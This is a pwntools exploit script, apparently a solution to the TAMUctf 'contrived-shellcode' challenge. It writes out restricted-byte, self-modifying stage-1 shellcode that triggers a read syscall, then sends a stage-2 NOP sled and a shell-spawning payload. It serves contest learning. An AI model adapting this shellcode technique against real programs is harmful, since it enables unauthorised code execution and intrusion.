from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)

gs = '''
break *$rebase(0x1293)
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="contrived-shellcode")
    else:
        return process(e.path)


p = start()


def pop_rsi():
    # pop rsi = 0x5e
    # 0x5e = 0xf*6+0x4
    rsi_pop = asm('add al, 0xf')*6
    rsi_pop += asm('add al, 0x4')
    rsi_pop += asm('add dword ptr [rip], eax')
    rsi_pop += b'\x00'*1
    rsi_pop += asm('add dword ptr [rip], eax')
    rsi_pop += b'\x00'*1
    rsi_pop += asm('add dword ptr [rip], eax')
    rsi_pop += b'\x00'*1
    log.info('> (pop rsi)*3 shellcode : (%i bytes)' % len(rsi_pop))
    return rsi_pop


def zero_edi():
    # mov rdi = 0xbf
    # (0xbf=0xba+0x5)
    edi_zero = asm('add al, 0xf')*6
    edi_zero += asm('add al, 0x7')
    edi_zero += asm('add dword ptr [rip], eax')
    edi_zero += b'\x00'*5
    log.info('> (mov edi, 0x0) shellcode : (%i bytes)' % len(edi_zero))
    return edi_zero


def big_edx():
    # 0:   ba fb 01 00 00          mov    edx, 0x1fb'
    # (0x1fbfba=0xbf+0xf0e0f+0xf*15+0xb)
    edx_big = asm('add eax, 0xf0e0f')
    edx_big += asm('add al,0xf')*15
    edx_big += asm('add al, 0xb')
    edx_big += asm('add dword ptr [rip], eax')
    edx_big += b'\x00'*5
    log.info('> (mov edx, 0x1fb) shellcode : (%i bytes)' % len(edx_big))
    return edx_big


def zero_rax():
    # sub rax, rax
    # 0:   48 29 c0                sub    rax, rax'
    # 0xc02948=0x1fbba+0xf0f0f*11+0xb0f0f+0x0f0f*6+0x90f+0x30f+0xf*6+8
    rax_zero = asm('add eax,0x0f0f0f')*11
    rax_zero += asm('add eax,0xb0f0f')
    rax_zero += asm('add eax, 0x0f0f')*6
    rax_zero += asm('add eax, 0x90f')
    rax_zero += asm('add eax, 0x30f')
    rax_zero += asm('add al, 0x0f')*6
    rax_zero += asm('add al, 0x8')
    rax_zero += asm('add dword ptr [rip], eax')
    rax_zero += b'\x00'*3
    log.info('> (sub rax, rax) shellcode : (%i bytes)' % len(rax_zero))
    return rax_zero


log.info('Building Stage1 Shellcode.')
stage1 = pop_rsi()
stage1 += zero_edi()
stage1 += big_edx()
stage1 += zero_rax()
stage1 += asm('syscall')

log.info('Throwing Stage 1 Shellcode (%i bytes)' % len(stage1))
p.sendline(stage1)
pause()

stage2 = asm(shellcraft.nop())*(len(stage1)+0x8*5)
stage2 += asm(shellcraft.sh())
log.info('Throwing Stage 2 Shellcode (%i bytes)' % len(stage2))
p.sendline(stage2)

p.interactive()
